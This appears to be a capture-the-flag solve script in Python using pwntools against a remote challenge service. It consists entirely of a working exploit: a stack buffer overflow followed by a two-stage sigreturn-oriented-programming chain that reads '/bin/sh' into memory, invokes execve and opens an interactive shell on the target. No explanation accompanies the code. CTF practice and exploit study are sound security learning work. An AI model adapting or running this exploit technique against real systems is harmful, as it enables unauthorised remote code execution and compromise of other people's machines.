#!/usr/bin/env python3
from pwn import *
io = remote("amt.rs", 27193)

frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = 0x00000000010d8100
frame.rdx = 0x200
frame.rsp = 0x00000000010d8100-48+8
frame.rip = 0x0000000001038e9a

io.sendline(b"A"*360 + p64(0x00000000010c5cc4) + p64(0xf) + p64(0x0000000001038e9a) + bytes(frame) + b"B"*8)

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = 0x00000000010d8100
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x0000000001038e9a
frame.rsp = 0x00000000010d9000

io.send(b"/bin/sh\x00" + p64(0x00000000010c5cc4) + p64(0xf) + p64(0x0000000001038e9a) + bytes(frame))
io.interactive()
